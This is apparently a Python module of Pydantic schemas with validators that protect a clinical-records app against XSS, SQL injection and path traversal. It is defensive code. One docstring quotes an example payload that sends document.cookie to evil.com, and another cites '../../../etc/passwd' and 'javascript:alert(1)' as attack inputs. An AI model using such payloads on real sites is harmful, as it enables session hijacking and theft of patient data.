"""
Schemas seguros para Historiales Clínicos con protección XSS completa
CRÍTICO: Los campos de texto libre (diagnóstico, tratamiento) son vulnerables a XSS
"""

from pydantic import BaseModel, validator
from typing import Optional, List
from datetime import datetime

from security.InputValidator import InputValidator


class HistorialCreate(BaseModel):
    id_paciente: int
    motivo_consulta: Optional[str] = None
    diagnostico: Optional[str] = None
    tratamiento: Optional[str] = None
    sesiones_planificadas: Optional[int] = None



    @validator('motivo_consulta', 'diagnostico', 'tratamiento')
    def validate_text_fields(cls, v):
        """
        CRÍTICO: Validar campos de texto libre

        Estos campos son especialmente vulnerables a XSS porque:
        - Son mostrados en el frontend sin escape
        - Contienen información médica que puede ser manipulada
        - Pueden contener scripts maliciosos

        Ejemplo de ataque:
        motivo_consulta = "<script>
            fetch('https://evil.com/steal?data=' + 
            document.cookie)
        </script>"
        """
        if v:
            # Validar contra XSS
            try:
                InputValidator.validate_xss(v)
            except Exception as e:
                raise ValueError(
                    f"Campo contiene contenido no permitido. "
                    f"Por seguridad, no se permiten etiquetas HTML o scripts."
                )

            # Validar contra SQL injection
            try:
                InputValidator.validate_sql_injection(v, strict=False)
            except Exception:
                raise ValueError(
                    f"Campo contiene caracteres sospechosos. "
                    f"Por favor, use solo texto normal."
                )

            v = InputValidator.sanitize_string(v, allow_html=False, max_length=5000)

            if len(v) > 5000:
                raise ValueError("Campo demasiado largo (máximo 5000 caracteres)")

            import re
            v = re.sub(r'\s+', ' ', v)

            return v.strip()
        return v

    @validator('sesiones_planificadas')
    def validate_sessions(cls, v):
        """Validar número de sesiones planificadas"""
        if v is not None:
            if not isinstance(v, int):
                raise ValueError("Sesiones planificadas debe ser un número entero")

            if v < 1 or v > 100:
                raise ValueError("Sesiones planificadas debe estar entre 1 y 100")

        return v

    @validator('id_paciente')
    def validate_patient_id(cls, v):
        """Validar ID de paciente"""
        if not isinstance(v, int) or v < 1:
            raise ValueError("ID de paciente inválido")
        return v


class HistorialUpdate(BaseModel):
    motivo_consulta: Optional[str] = None
    diagnostico: Optional[str] = None
    tratamiento: Optional[str] = None
    sesiones_planificadas: Optional[int] = None

    # ✅ REUTILIZAR VALIDADORES
    _validate_text = validator(
        'motivo_consulta', 'diagnostico', 'tratamiento',
        allow_reuse=True
    )(HistorialCreate.validate_text_fields.__func__)

    _validate_sessions = validator('sesiones_planificadas', allow_reuse=True)(
        HistorialCreate.validate_sessions.__func__
    )


class HistorialRead(BaseModel):
    id_historial: int
    id_paciente: int
    motivo_consulta: Optional[str]
    diagnostico: Optional[str]
    tratamiento: Optional[str]
    sesiones_planificadas: Optional[int]
    fecha_ingreso: datetime

    class Config:
        from_attributes = True


class DocumentoCreate(BaseModel):
    id_historial: int
    tipo_documento: str
    url_archivo: str
    descripcion: Optional[str] = None

    @validator('tipo_documento')
    def validate_document_type(cls, v):
        """Validar tipo de documento"""
        if not v:
            raise ValueError("Tipo de documento requerido")

        # Sanitizar
        v = InputValidator.sanitize_string(v, allow_html=False, max_length=100)

        # Validar contra inyecciones
        try:
            InputValidator.validate_xss(v)
            InputValidator.validate_sql_injection(v)
        except Exception:
            raise ValueError("Tipo de documento contiene caracteres no permitidos")

        # Tipos válidos predefinidos
        valid_types = [
            "Receta", "Análisis", "Imagen", "Formulario",
            "Consentimiento", "Factura", "Otro"
        ]

        if v not in valid_types:
            raise ValueError(
                f"Tipo de documento inválido. Válidos: {', '.join(valid_types)}"
            )

        return v

    @validator('url_archivo')
    def validate_url(cls, v):
        """
        Validar URL del archivo

        CRÍTICO: Proteger contra:
        - Path traversal: ../../../etc/passwd
        - XSS en URL: javascript:alert(1)
        - URLs maliciosas
        """
        if not v:
            raise ValueError("URL de archivo requerida")

        # Validar contra path traversal
        try:
            InputValidator.validate_path_traversal(v)
        except Exception:
            raise ValueError("URL contiene caracteres no permitidos (..)")

        # Validar contra XSS
        try:
            InputValidator.validate_xss(v)
        except Exception:
            raise ValueError("URL contiene caracteres no permitidos")

        # Sanitizar
        v = InputValidator.sanitize_string(v, allow_html=False, max_length=500)

        # Validar formato de URL básico
        import re
        # Permitir URLs de S3, Supabase Storage, URLs relativas
        if not re.match(r'^(https?://|/|storage/)', v):
            raise ValueError("URL debe empezar con https://, http://, / o storage/")

        # No permitir javascript:, data:, vbscript:
        if re.match(r'^(javascript|data|vbscript):', v, re.IGNORECASE):
            raise ValueError("Protocolo de URL no permitido")

        return v

    @validator('descripcion')
    def validate_description(cls, v):
        """Validar descripción del documento"""
        if v:
            # Validar XSS
            try:
                InputValidator.validate_xss(v)
            except Exception:
                raise ValueError("Descripción contiene caracteres no permitidos")

            # Sanitizar
            v = InputValidator.sanitize_string(v, allow_html=False, max_length=500)

            if len(v) > 500:
                raise ValueError("Descripción demasiado larga (máximo 500 caracteres)")

        return v

    @validator('id_historial')
    def validate_historial_id(cls, v):
        """Validar ID de historial"""
        if not isinstance(v, int) or v < 1:
            raise ValueError("ID de historial inválido")
        return v


class DocumentoRead(BaseModel):
    id_documento: int
    id_historial: int
    tipo_documento: str
    url_archivo: str
    descripcion: Optional[str]
    fecha_subida: datetime

    class Config:
        from_attributes = True